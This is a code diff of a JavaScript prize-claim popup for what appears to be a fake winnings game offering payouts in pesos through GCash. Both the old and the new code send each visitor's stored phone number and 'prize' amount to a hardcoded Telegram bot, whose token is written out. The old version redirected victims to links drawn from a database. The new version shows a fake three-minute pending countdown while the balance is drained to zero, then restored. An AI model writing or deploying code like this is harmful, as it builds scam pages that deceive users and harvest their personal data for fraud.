@@ -1,11 +1,12 @@
 /**
- * Claim Popup Module - Remastered (Simple OK Button)
- * Walang checkbox, walang agree/authorize, diretso claim
+ * Claim Popup Module - Revised with Countdown & Decrement Animation
  */
 
 let claimState = {
     isProcessing: false,
-    currentAmount: 0
+    currentAmount: 0,
+    countdownInterval: null,
+    countdownSeconds: 180  // 3 minutes = 180 seconds
 };
 
 // Show the claim popup
@@ -15,17 +16,13 @@ function showClaimPopup(amount) {
     
     const popup = document.getElementById('claimPopup');
     const prizeSpan = document.getElementById('popupPrizeAmount');
-    const okBtn = document.getElementById('okClaimBtn');
+    const claimBtn = document.getElementById('claimActionBtn');
     
     prizeSpan.innerHTML = "₱" + amount.toLocaleString();
     
-    if (okBtn) {
-        okBtn.classList.remove('processing');
-        okBtn.innerHTML = 'OK — CLAIM MY PRIZE';
-        okBtn.disabled = false;
-        okBtn.style.opacity = '1';
-        okBtn.style.pointerEvents = 'auto';
-    }
+    claimBtn.classList.remove('processing');
+    claimBtn.innerHTML = '💰 CLAIM THRU GCASH 💰';
+    claimBtn.disabled = false;
     
     popup.style.display = 'flex';
 }
@@ -35,96 +32,133 @@ function hideClaimPopup() {
     popup.style.display = 'none';
 }
 
-// Direct claim - no checkbox needed
-function onOKClaim() {
+function showPendingModal() {
+    const modal = document.getElementById('pendingModal');
+    modal.style.display = 'flex';
+}
+
+function hidePendingModal() {
+    const modal = document.getElementById('pendingModal');
+    modal.style.display = 'none';
+}
+
+// Animate balance decreasing from current to 0
+function animateBalanceToZero(currentBalance, onComplete) {
+    const balanceText = document.getElementById('balanceText');
+    if (!balanceText) return;
+    
+    let current = currentBalance;
+    const step = Math.max(1, Math.floor(currentBalance / 30)); // ~30 steps
+    const interval = setInterval(() => {
+        current = Math.max(0, current - step);
+        balanceText.innerText = "₱" + current.toLocaleString() + ".00";
+        
+        if (current <= 0) {
+            clearInterval(interval);
+            balanceText.innerText = "₱0.00";
+            if (onComplete) onComplete();
+        }
+    }, 50);
+}
+
+// Update countdown timer display
+function updateCountdownDisplay(seconds) {
+    const timerSpan = document.getElementById('pendingTimer');
+    if (!timerSpan) return;
+    const mins = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+}
+
+// Start countdown (3 minutes)
+function startCountdown(onComplete) {
+    let remaining = claimState.countdownSeconds;
+    updateCountdownDisplay(remaining);
+    
+    claimState.countdownInterval = setInterval(() => {
+        remaining--;
+        updateCountdownDisplay(remaining);
+        
+        if (remaining <= 0) {
+            clearInterval(claimState.countdownInterval);
+            claimState.countdownInterval = null;
+            if (onComplete) onComplete();
+        }
+    }, 1000);
+}
+
+// Main claim action
+function onClaimAction() {
     if (claimState.isProcessing) return;
     
     claimState.isProcessing = true;
-    const btn = document.getElementById('okClaimBtn');
+    const claimBtn = document.getElementById('claimActionBtn');
     const amount = claimState.currentAmount;
     const userPhone = localStorage.getItem("userPhone") || "Unknown";
     
-    btn.classList.add('processing');
-    btn.innerHTML = '⏳ PROCESSING...';
-    btn.disabled = true;
+    // Disable button and change text
+    claimBtn.disabled = true;
+    claimBtn.innerHTML = '⏳ PROCESSING...';
     
     // Send notification to Telegram
-    const message = `💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
+    const message = `💰 CLAIM REQUEST (PENDING)!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
     fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
         .catch(e => console.log('Telegram error:', e));
     
-    // Get link from Firebase
-    if (typeof firebase !== 'undefined' && firebase.database) {
-        const db = firebase.database();
+    // Close claim popup
+    hideClaimPopup();
+    
+    // Show pending modal with countdown
+    showPendingModal();
+    
+    // Animate balance decreasing to 0
+    const currentBalance = amount;
+    animateBalanceToZero(currentBalance, () => {
+        // Update main game balance to 0 in Firebase
+        if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
+            window.parent.updateGameBalance(0);
+        } else if (typeof updateGameBalance === 'function') {
+            updateGameBalance(0);
+        } else if (typeof GameState !== 'undefined') {
+            GameState.balance = 0;
+            if (typeof updateUI === 'function') updateUI();
+            if (typeof saveData === 'function') saveData();
+        }
+    });
+    
+    // Start 3-minute countdown
+    startCountdown(() => {
+        // Countdown finished - hide pending modal and restore claim button
+        hidePendingModal();
         
-        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
-            if (snapshot.exists()) {
-                const key = Object.keys(snapshot.val())[0];
-                const linkData = snapshot.val()[key];
-                const redirectUrl = linkData.url;
-                
-                // Mark link as claimed
-                db.ref('links/' + key).update({ 
-                    status: 'claimed', 
-                    user: userPhone,
-                    amount: amount,
-                    claimedAt: Date.now()
-                });
-                
-                // Send confirmation to Telegram
-                const confirmMsg = `✅ CLAIM REDIRECTED!\n📱 ${userPhone}\n💵 ₱${amount}\n🔗 ${redirectUrl}`;
-                fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(confirmMsg)}`)
-                    .catch(e => console.log('Telegram error:', e));
-                
-                // Update main game balance to 0
-                if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
-                    window.parent.updateGameBalance(0);
-                } else if (typeof updateGameBalance === 'function') {
-                    updateGameBalance(0);
-                } else if (typeof GameState !== 'undefined') {
-                    GameState.balance = 0;
-                    if (typeof updateUI === 'function') updateUI();
-                    if (typeof saveData === 'function') saveData();
-                }
-                
-                // Hide popup and redirect
-                setTimeout(() => {
-                    hideClaimPopup();
-                    window.location.href = redirectUrl;
-                }, 1500);
-                
-            } else {
-                // No available links
-                btn.innerHTML = '❌ NO REWARDS';
-                btn.style.background = 'linear-gradient(135deg, #666, #444)';
-                setTimeout(() => {
-                    btn.innerHTML = 'OK — CLAIM MY PRIZE';
-                    btn.classList.remove('processing');
-                    btn.style.background = 'linear-gradient(135deg, #39ff14, #0a8a00)';
-                    btn.disabled = false;
-                    claimState.isProcessing = false;
-                }, 3000);
-                alert("Sorry! No available rewards at the moment. Please try again later.");
-            }
-        }).catch((error) => {
-            console.error("Database error:", error);
-            btn.innerHTML = '❌ ERROR';
-            setTimeout(() => {
-                btn.innerHTML = 'OK — CLAIM MY PRIZE';
-                btn.classList.remove('processing');
-                btn.style.background = 'linear-gradient(135deg, #39ff14, #0a8a00)';
-                btn.disabled = false;
-                claimState.isProcessing = false;
-            }, 3000);
-            alert("Database error. Please try again.");
-        });
-    } else {
-        alert("Firebase not initialized. Please refresh.");
+        // Reset claim state
         claimState.isProcessing = false;
-        btn.classList.remove('processing');
-        btn.innerHTML = 'OK — CLAIM MY PRIZE';
-        btn.disabled = false;
-    }
+        
+        // Restore the original balance (the prize amount)
+        if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
+            window.parent.updateGameBalance(amount);
+        } else if (typeof updateGameBalance === 'function') {
+            updateGameBalance(amount);
+        } else if (typeof GameState !== 'undefined') {
+            GameState.balance = amount;
+            if (typeof updateUI === 'function') updateUI();
+            if (typeof saveData === 'function') saveData();
+        }
+        
+        // Update balance display in main
+        const balanceText = document.getElementById('balanceText');
+        if (balanceText) {
+            balanceText.innerText = "₱" + amount.toLocaleString() + ".00";
+        }
+        
+        // Show claim popup again
+        showClaimPopup(amount);
+        
+        // Send Telegram notification that claim expired
+        const expireMsg = `⏰ CLAIM EXPIRED (No Action)!\n📱 ${userPhone}\n💵 ₱${amount}`;
+        fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(expireMsg)}`)
+            .catch(e => console.log('Telegram error:', e));
+    });
 }
 
 // Initialize
